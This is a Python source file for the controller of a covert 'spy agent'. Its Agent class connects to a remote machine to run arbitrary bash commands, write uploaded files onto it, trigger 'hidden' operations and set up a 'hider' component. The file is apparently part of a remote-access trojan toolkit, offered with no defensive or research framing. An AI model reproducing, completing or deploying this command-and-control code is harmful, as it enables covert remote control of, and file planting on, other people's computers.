from connection import Connection
from command import Command
from responce import Responce
from funCode import FunCode

"""this class is for controling 1 spy agent"""


class Agent:

    def __init__(self, host: str, port: int) -> None:
        self.host = host
        self.port = port

    def __repr__(self) -> str:
        return f"Agent(host={self.host}, port={self.port})"

    def connect(self) -> Connection:
        return Connection.connect(self.host, self.port)

    def run_bash(self, bash: str) -> tuple[Responce, str]:
        with self.connect() as conn:
            conn.send_command(Command(len(bash), FunCode.RUN_BASH, bash))
            return conn.recv_full_responce()

    def write_file(self, homeFilePath, targetFileName: str) -> Responce:

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        with self.connect() as conn:
            conn.send_command(
                Command(len(fileContent), FunCode.WRITE_FILE, targetFileName)
            )
            conn.send_data(fileContent)
            return conn.recv_responce_struct()

    def hidden_action_without_upload(self, fncode: FunCode) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD not in fncode

        with self.connect() as conn:
            conn.send_command(Command(0, FunCode.HIDDEN_OPRATION | fncode, ""))
            return conn.recv_full_responce()

    def hidden_action_with_upload(
        self, fncode: FunCode, homeFilePath, targetFileName: str
    ) -> tuple[Responce, str]:
        assert FunCode.HIDDEN_UPLOAD in fncode

        with open(homeFilePath, "rb") as file:
            fileContent = file.read()

        with self.connect() as conn:
            conn.send_command(
                Command(
                    len(fileContent), FunCode.HIDDEN_OPRATION | fncode, targetFileName
                )
            )
            conn.send_data(fileContent)
            return conn.recv_full_responce()

    # prob redundant in future
    def hider_setup(self, hiderPath: str) -> Responce:
        with self.connect() as conn:
            conn.send_command(Command(0, FunCode.HIDER_SETUP, hiderPath))
            return conn.recv_responce_struct()
